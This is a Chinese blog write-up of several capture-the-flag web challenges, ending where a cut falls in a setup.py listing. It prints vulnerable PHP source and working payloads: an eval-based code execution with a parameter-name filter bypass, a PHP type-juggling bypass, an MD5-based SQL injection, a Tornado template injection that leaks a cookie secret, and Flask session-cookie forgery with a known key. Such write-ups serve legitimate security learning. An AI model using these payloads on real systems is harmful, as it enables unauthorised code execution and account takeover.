<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>源码提供了第二层过滤的信息，ban掉了很多空白字符。目标是利用eval实现RCE；第一层过滤体现在服务器上，检测参数num是否含有一些敏感字符。</p>
<ol>
<li><p>传参时通过在num前加一个空格来绕过第一层防火墙，原理是php在解析传参时会自动处理参数名前的空白字符，而服务器又会准确识别空白字符，这就导致服务器端与PHP端的处理出现差异，服务器认为是名为空格+num的参数被传了过来，因此不做防火墙检测；PHP端则去掉了空格，将传递的参数名依旧识别成num，因此内容正确的传递给了变量 <code>$_GET[&#39;num&#39;]</code> 但又绕过了服务器的防火墙。</p>
</li>
<li><p>读取目录payload：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">20</span>num=<span class="number">1</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure></div>

<p>scandir扫描目标目录下的内容并转化成对象格式，由于 <code>&quot;/&quot;</code> 中的引号被过滤，使用 <code>chr(47)</code> 替代，得到结果中发现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[7]=&gt; string(5) &quot;f1agg&quot;</span><br></pre></td></tr></table></figure></div>

<p>读取flag：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">?%<span class="number">20</span>num=<span class="number">1</span>;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure></div>

<p><code>file_get_contents()</code> 读取指定文件的内容，拼接chr字符得到字符串 <code>&quot;/f1agg&quot;</code> 从而获取flag：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1string(43) &quot;flag&#123;d715621b-fd8a-480d-8127-c95614ff05c3&#125; &quot;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>F12发现PHP源码片段：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	~~~post money and password~~~</span></span><br><span class="line"><span class="comment">if (isset($_POST[&#x27;password&#x27;])) &#123;</span></span><br><span class="line"><span class="comment">	$password = $_POST[&#x27;password&#x27;];</span></span><br><span class="line"><span class="comment">	if (is_numeric($password)) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;elseif ($password == 404) &#123;</span></span><br><span class="line"><span class="comment">		echo &quot;Password Right!&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><code>%00404</code> 可以绕过 <code>is_numeric()</code> 但 <code>$password==404</code> 不成立</p>
<p><code>404%20</code> 与 <code>404%00</code> 既可以绕过数字判定又与404弱类型相等。</p>
<p>Cookie中 <code>user=1</code> 表示是Cuiter。</p>
<p><code>money=100000000</code> 会提示传入长度过长，使用 <code>1e16</code> 即可通过money检测。</p>
<p>最终payload的HTTP包：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/pay.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>26</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81/index.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>user=1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">password</span>=<span class="number">404</span>%<span class="number">00</span>&amp;money=<span class="number">1</span>e10</span></span><br></pre></td></tr></table></figure></div>

<p> 得到flag：<code>flag&#123;f811808d-0044-423a-a7f8-363edd027b54&#125;</code></p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>参考：<a class="link"   href="https://blog.csdn.net/weixin_50597969/article/details/115492810" >Easy MD5-wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>共有三关，第一关提示在HTTP响应头中：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Hint</span><span class="punctuation">: </span>select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure></div>

<p>要实现还是SQL注入，但要求是字符串经过 <code>md5()</code> 转化后达到注入的效果，例如 <code>ffifdyop</code> md5加密后变成 <code>&#39;or&#39;...</code> 后面跟上一串无引号的字符串即可实现注入，最重要的是加密后前几个字符依次为单引号、or、单引号，可以编写如下脚本去爆破一个类似的：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>[] = <span class="number">5</span>;</span><br><span class="line"><span class="comment">// var_dump($_GET[&#x27;a&#x27;]);</span></span><br><span class="line"><span class="comment">// var_dump($b);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$all</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$blank</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">150</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$blank</span>=<span class="variable">$blank</span>.<span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">burst</span>(<span class="params"><span class="variable">$num</span>, <span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$blank</span>, <span class="variable">$cnt</span>, <span class="variable">$all</span>;</span><br><span class="line">    <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>&lt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r&quot;</span>.<span class="variable">$blank</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;\r&quot;</span>.<span class="variable">$cnt</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$all</span>.<span class="string">&quot;--md5(&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;) = &quot;</span>.<span class="variable">$tmp</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$tmp</span>)&gt;<span class="number">4</span> <span class="keyword">and</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$tmp</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;&#x27;&quot;</span>) <span class="keyword">echo</span> <span class="string">&quot;md5(&quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;) = &quot;</span>.<span class="variable">$tmp</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">65</span>; <span class="variable">$i</span>&lt;<span class="number">123</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">burst</span>(<span class="variable">$num</span>-<span class="number">1</span>, <span class="variable">$str</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">8</span>; <span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$all</span> = <span class="title function_ invoke__">pow</span>(<span class="number">58</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="title function_ invoke__">burst</span>(<span class="variable">$i</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>php index.php</code> 可以以脚本形式运行php，若是以服务器文件加载php脚本，过长的爆破时间会导致服务器响应超时。实际上该爆破由于爆破时间过长并不可行。</p>
<p>Tips：php可以以脚本形式运行，在配过PHP环境的情况下，直接 <code>php index.php</code> 即可以脚本方式运行php源码。</p>
<p>注入成功后进入第二关，F12看到源码提示：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>

<p>用数组即可：<code>?a[]=1&amp;b[]=2</code> </p>
<p>进入第三关：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>虽然变成了严格比较，但是数组依然能绕过（因为md5解析数组都是NULL）：<code>param1[]=1&amp;param2[]=2</code> </p>
<p>最后得到flag：<code>flag&#123;22d586ce-674e-44d8-af08-729a476d4f6a&#125;</code> </p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>参考：<a class="link"   href="https://www.cnblogs.com/xhds/p/12285121.html" >2018护网杯(WEB)easy_tornado(模板注入) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>“&#x2F;flag.txt”提示flag在”&#x2F;fllllllllllllag”中</p>
<p>“&#x2F;welcome.txt”返回”render”提示存在模板注入(?)</p>
<p>“&#x2F;hints.txt”提示filehash的加密方式：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(cookie_secret+<span class="title function_ invoke__">md5</span>(filename))</span><br></pre></td></tr></table></figure></div>

<p>目标是拿到”&#x2F;fllllllllllllag”的filehash，首先需要拿到cookie_secret。</p>
<p>tornado模板下传入：<code>&#123;&#123;handler.settings&#125;&#125;</code> 可以获取环境变量</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;2*7&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; ORZ</span><br><span class="line">(这算是注入成了?)</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/error?msg=&#123;&#123;handle/settings&#125;&#125;</span><br><span class="line"></span><br><span class="line">=&gt; &#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;39cedf08-4782-4456-b648-fa29f2c3aba9&#x27;&#125;</span><br></pre></td></tr></table></figure></div>

<p>PHP脚本跑一下可以获得filehash：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;39cedf08-4782-4456-b648-fa29f2c3aba9&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&quot;/fllllllllllllag&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_hash</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;/hints.txt&quot;</span> =&gt; <span class="string">&quot;6718cdb87bbfdf01834d2ff058dfc77a&quot;</span>, </span><br><span class="line">    <span class="string">&quot;/hints.txt-res&quot;</span> =&gt; <span class="string">&quot;85873c38514234be233f9318a17450f5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/flag.txt&quot;</span> =&gt; <span class="string">&quot;40dfb7391c19a66939e6b6f4e9898804&quot;</span>, </span><br><span class="line">    <span class="string">&quot;/flag.txt-res&quot;</span> =&gt; <span class="string">&quot;e27ed0a861b00185d3429dd62561bd1c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/welcome.txt&quot;</span> =&gt; <span class="string">&quot;89aebe7e1c82925a8896b18ed6bd3335&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/welcome.txt-res&quot;</span> =&gt; <span class="string">&quot;617415f68384bc7b96ee0b6b0df42809&quot;</span></span><br><span class="line">    )</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>filehash：<code>06d280b8d701aaea9f2c8bc5e21605b6</code></p>
<p>payload：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=06d280b8d701aaea9f2c8bc5e21605b6</span><br><span class="line"></span><br><span class="line">=&gt; /fllllllllllllag</span><br><span class="line">flag&#123;811abc8f-ce7b-4c88-bb5b-4c89a65efac0&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>Login过滤了引号，时间盲注不成功</p>
<p>参考：<a class="link"   href="https://www.anquanke.com/post/id/164086" >一题三解——[HCTF 2018]admin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr>
<h3 id="思路一：Session伪造"><a href="#思路一：Session伪造" class="headerlink" title="思路一：Session伪造"></a>思路一：Session伪造</h3><p><a class="link"   href="https://github.com/noraj/flask-session-cookie-manager" >Flask-Session加密解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>随意注册一个账号后，在修改密码的页面源码中能看到网站源码的Github仓库。由于我做这题时仓库中的源码已经消失了，因此主要看WP解题（233）</p>
<p>源码中显示只要Session中的”name”键的值为”admin”即可获得管理员权限，因此目标是伪造Session。</p>
<p>Flask对Session进行了签名处理后标记在Cookie后，用来检查Cookie是否被篡改；Session的编码过程在Flask源码中可见，可以编写逆处理脚本还原Json对象，查看Session内容：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure></div>

<p>先随意注册一个账号，拿到一串Session：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJw9kM2KwjAUhV9luGsXjrYbwUWH1KJwE5Royd2Io7Ex6XWgVdqJ-O5TZHB9Dt_5ecD-3NjWwezW3O0I9pcTzB7w8Q0zkLr2WK6jYZOSDlHqqlN6PSXhalmSk8XKI2-80cuE9LInsWKls0Tq4xh9mKLIOyW2Cfk8VeLkpHcBdehILNjoTa10PjExSwZfjzrrsMwTLFeDzyTEC8aCamIcy1ilVC4cecmosZdDhhJZbyLVkreJYZzDcwTHtjnvbz_BXt8TiHfB-OOUChNl3Dj0-VBnVyuRp-i_ghKhl8X613jHqsQBaSZYzV-4Cx8q-yadtrvO_ivXAw8CnG17u8MI7q1tXr_B5xief8q8blk.ZGTtEQ.85FS0oT2YTk2KHJbNYzcvA_coIY</span><br></pre></td></tr></table></figure></div>

<p>用脚本解码后得到：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>&#x27;_fresh&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span> &#x27;_id&#x27;<span class="punctuation">:</span> b&#x27;<span class="number">59</span>c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc&#x27;<span class="punctuation">,</span> &#x27;csrf_token&#x27;<span class="punctuation">:</span> b&#x27;fedb77df374a218f5e81920d8914d2b8f9c1c662&#x27;<span class="punctuation">,</span> &#x27;image&#x27;<span class="punctuation">:</span> b&#x27;uEpz&#x27;<span class="punctuation">,</span> &#x27;name&#x27;<span class="punctuation">:</span> &#x27;festu&#x27;<span class="punctuation">,</span> &#x27;user_id&#x27;<span class="punctuation">:</span> &#x27;<span class="number">10</span>&#x27;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>修改name再加密回去，由于要正确的签名，需要”secret_key”，在源码中可以找到 <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ，再利用脚本进行加密：</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">py flask_session_cookie_manager3.py encode <span class="literal">-s</span> ckj123 <span class="literal">-t</span> <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;59c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc&#x27;, &#x27;csrf_token&#x27;: b&#x27;fedb77df374a218f5e81920d8914d2b8f9c1c662&#x27;, &#x27;image&#x27;: b&#x27;uEpz&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">=&gt;.eJw9kM2KwjAUhV9luGsXjqYbwUWH1KJwE5Royd2IY2tj0utAVdqJ<span class="literal">-O5TZHB9Dt_5ecD-1FZXB7Nbe69GsD-XMHvAxzfMQJnGY7GOlm1CJkRl6k6b9ZSka1RBTuUrj7zx1iwFmWVPcsXapEKZ4xh9mKLMOi23gnyWaFk65V1AEzqSC7Zm02iTTWxMxeDr0aQdFpnAYjX4rCBeMObUEONYxTqhYuHIK0aDvRoytEx7G6lRvBWWcQ7PERyv7Wl_-wnV5T2BeBesP04pt1HFjUOfDXV2jZZZgv4raBl6la9_rXesCxyQdoL1_IU786Gu3qRyu-uqf-Vy4EGAQ8nnC4zgfq3a12_wOYbnH8hybjs</span>.ZGT15A.<span class="number">3</span>MkVXDRdC8_LSSMPuX9Kw5Q5vwU</span><br></pre></td></tr></table></figure></div>

<p>将其复制进Session中即可得到Flag：<code>flag&#123;b865b8d4-cb96-4f76-b368-cb72b79f30ec&#125;</code></p>
<p>装脚本的时候遇到了一些有趣的问题，由于文件夹一开始命名为”[HCTF 2018]admin” 含有空格和 <code>[]</code> 符号，Powershell读取不出，因此右键打开终端时，终端路径自动跳转到了Powershell可执行文件的位置。删除空格和 <code>[]</code> 后恢复正常。</p>
<p>GitHub下载下源码后，需要更改”setup.py”的内容才能安装：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> join, dirname</span><br><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup, find_packages	<span class="comment"># Mark1</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read = <span class="keyword">lambda</span> filepath: codecs.<span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;publish&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">    os.system(<span class="string">&#x27;python -m twine upload dist/*&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;package&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">    os.system(<span class="string">&#x27;python setup.py bdist bdist_egg&#x27;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">setup(</span><br><span class="line">    name=<span class="string">&quot;flask-session-cookie-manager&quot;</span>,</span><br><span class="line">    packages=find_packages(include=[<span class="string">&#x27;flask-session-cookie-manager2&#x27;</span>, <span class="string">&#x27;flask-session-cookie-manager3&#x27;</span>]),		<span class="comment"># Mark2</span></span><br><span class="line">    version=<span class="string">&#x27;1.2.1.1&#x27;</span>,</span><br><span class="line">    description=<span class="string">&quot;simple Python script to deal with Flask session cookie&quot;</span>,</span><br><span class="line">    long_description=read(join(dirname(__file__), <span class="string">&#x27;README.md&#x27;</span>)),</span><br><span class="line">    long_description_content_type=<span class="string">&#x27;text/markdown&#x27;</span>,</span><br><span class="line">    keywords=<span class="string">&#x27;Flask session cookie&#x27;</span>,</span><br><span class="line">    author=<span class="string">&#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span>,</span><br><span class="line">    maintainer=<span class="string">&#x27;Alexandre ZANNI, TAbdiukov&#x27;</span>,</span><br><span class="line">    license=<span class="string">&#x27;MIT&#x27;</span>,</span><br><span class="line">    url=<span class="string">&#x27;https://github.com/noraj/flask-session-cookie-manager&#x27;</span>,</span><br><span class="line">    include_package_data=<span class="literal">True</span>,</span><br><span class="line">    classifiers=[</span><br><span class="line">        <span class="string">&#x27;Operating System :: OS Independent&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python :: 2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Programming Language :: Python :: 3&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;License :: Other/Proprietary License&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Topic :: Security&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Topic :: 